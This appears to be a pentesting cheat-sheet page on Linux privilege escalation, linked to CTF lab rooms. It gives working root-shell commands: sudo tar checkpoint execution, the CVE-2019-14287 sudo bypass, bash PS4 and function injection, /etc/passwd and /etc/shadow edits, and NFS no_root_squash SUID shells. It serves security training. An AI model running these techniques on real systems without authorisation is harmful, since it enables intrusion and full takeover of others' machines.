As there isn't much we can do as a regular user, we will try to elevate our level of privileges to root (administrator). You may have to do horizontal escalation first, i.g. moving to another account that has the same level of privilege, but may have different permissions.

* Find misconfiguration <small>(sudo, system files, NFS...)</small>
* Find a vulnerable service and exploit it <small>(apache, mysql...)</small>
* Find processes/tasks/script in which you can inject data
  * cron jobs
  * executables with the SUID bit
  * ...
* Find a vulnerability in the kernel
* ...

The **goal is to pop out a bash as root** (root bash), basically, the same as if the administrator used `sudo -s`.

</div><div>

There are many scripts **automated scripts** that will investigate usual places, services, files... that you may want to look at. You will still have to understand the output, dig into it...

<div class="row row-cols-md-2"><div>

It's common for well-known Linux commands to be misconfigured. Vulnerabilities can lead to reading/writing root-only files, execute commands as root...

**[gtfobins](https://gtfobins.github.io/)** (7.4k ‚≠ê) is the reference when looking for commands to exploit misconfigured Linux commands.

> There is a local version of [gtfo in Python](https://github.com/t0thkr1s/gtfo) (96 ‚≠ê, 2021).
</div><div>

Example: you can only run `tar` using `sudo`. Run the command below from [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo), and you will get a bash as root.

```bash
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

> I'm adding [some extras here](gtfobins.md).

## Exploit sudo

*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ‚≠ê).

<div class="row row-cols-md-2"><div>

[![picklerick](../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)

Try to find commands that can be run with sudo

```bash
$ sudo -nl # test if you can sudo without a password
$ sudo -l # if you can't, try with your password
# -> if both cases, if you were successful
# and there are some interesting stuff such as:
Matching Defaults entries for [...]:
    [...] # vulnerable env variables? (LD_PRELOAD...)

User [...] may run the following commands on [...]:
    (root) /bin/tar # see tar#sudo on GTFOBins
```

It's possible for the administrator to only allow a command/multiple commands to be run as root by a user. This is the case with `tar` above. If you can see `ALL`, then you can run any command as root. 
</div><div>

**sudo before 1.8.28 (CVE-2019-14287)**

[![agentsudoctf](../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)

If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.

```bash
$ sudo -u#-1 tar [...]
$ sudo -u#4294967295 tar [...]
```
</div></div>

## Environment

<div class="row row-cols-md-2"><div>

In a lot of cases (SUID/GUID, sudo, capabilities...), you may have to use the trick of editing the environment. In all the cases listed, a **regular user** is allowed to run an executable/command/script **as root**.

There are basic scenarios in which you can directly exploit the executable, but in other scenarios, you may have to exploit the environment, meaning

* edit the environment variables
* edit the files used by the program
* ...

For instance, if a script using the command `ls` and the environment variable `PATH` with the value `/tmp:[...]`, then because you can write in `/tmp`, you can create an executable named `ls` which is actually a `bash`. When the script run as root is executed, the command bash is executed as root, and your escalation is done.
</div><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

## Misconfigured permissions

<div class="row row-cols-md-2"><div>

If `/etc/passwd` was <s>intentionally</s> misconfigured

```bash
$ cat /etc/passwd
# if you can read it: try to bruteforce the password
# if you can write it: change the root password
# (copy a password / generate one mkpasswd -m sha-512 toto)
```

If `/etc/shadow` was <s>intentionally</s> misconfigured

```bash
$ cat /etc/shadow
# if you can write it: make your user part of root group
# if you can write it: add a new user that is part of root group
# (copy a password / generate one mkpasswd -m sha-512 toto)
```
</div><div>

Until 1979/Unix V7, passwords were stored in `/etc/passwd`, so a regular user could read them, and try brute-forcing the password.

```bash
$ cat /etc/shadow
- root:x:...
+ root:hashed_password:...
# openssl passwd toto
```
</div></div>

<hr class="sep-both">

## SUID/GUID bit

[![vulnversity](../../_badges/thm-p/vulnversity.svg)](https://tryhackme.com/room/vulnversity)
[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)
[![rrootme](../../_badges/thm-p/rrootme.svg)](https://tryhackme.com/room/rrootme)

<div class="row row-cols-md-2"><div>

Scripts having the SUID bit can be executed with the permissions of their owner. GUID is the same with the group owner permissions. If you find interesting files using find, check them out on GTFOBins.

```bash
# "-04000" "-4000" | "-4001"
$ find / -perm -u=s -type f -ls 2>/dev/null
# and group
$ find / -perm -g=s -type f -ls 2>/dev/null
```

> **CVE-2021-4034**: `/usr/bin/pkexec` a file installed by default on
every major Linux distribution with a **SUID bit** could be exploited to get root. See [arthepsy PoC](https://github.com/arthepsy/CVE-2021-4034) (913 ‚≠ê), or [berdav PoC](https://github.com/berdav/CVE-2021-4034) (1.7k ‚≠ê).
</div><div>

If the script **hand-made**, or **not on GTFOBins**, then you can use the commands below to hopefully find which files and environment variables the script is using

* `strace script`: see every system call
* `strings script`: extract every readable string, may not be installed

You may be able to make the script do what you want by editing environment variables or files that it uses.
</div></div>

## Capabilities

<div class="row row-cols-md-2"><div>

Capabilities are a level below SUID/GUID permissions. It's possible for an administrator to allow an executable to use some "features" that usually would require root privileges <small>(ex: creating sockets, creating raw TCP packets...)</small>.

Find executables with capabilities

```bash
$ getcap -r / 2>/dev/null
```
</div><div>

Then, 

* Look for the executable on [GTFOBins](https://gtfobins.github.io/#+capabilities)
* Use the same techniques that for SUID/GUID files not on GTFOBins
</div></div>

<hr class="sep-both">

## Network File System (NFS)

[![kenobi](../../_badges/thm-p/kenobi.svg)](https://tryhackme.com/room/kenobi)

<div class="row row-cols-md-2"><div>

To avoid copying and pasting information too much, you will have to read these pages for more information.

* [NFS protocol](/info/networking/protocols/index.md#-nfs---2049-tcp)
* [NFS notes](/cyber/exploitation/services/index.md#nfs---2049-tcp)

To summarize, locally, you can use this command to find NFS shares.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>

You will find an exploitable NFS misconfiguration when the option `no_root_squash` is set for a share. Root squashing map any local user to the user "nobody". If disabled, then the root user on the local machine will have root privilege inside the share.

```bash
# on the remote host, we create a bash inside the share
$ cp /bin/bash /share/sbash
# on the local host
# we give the file root privileges
$ sudo chown root /tmp/share/sbash
$ sudo chmod +s /tmp/share/sbash
# Then on the host, running the SUID file
# will run it as root
$ /share/sbash -p
```
</div></div>

## Kernel exploits

<div class="row row-cols-md-2"><div>

Kernel exploits should be used at a last resort, as they will most probably severely impact the machine state/crash the machine if they fail. You can find the complete list of CVE for the Linux Kernel [here](https://www.linuxkernelcves.com/cves).

* [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) on Linux kernel <4.8.3
</div><div>

There are scripts, but remember that they may generate false positives or false negatives.

* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (3.9k ‚≠ê): still updated with new exploits
* [Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) (1.6k ‚≠ê): up to 4.x excluded
* [Linux Kernel Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (1.4k ‚≠ê): up to 5.x excluded
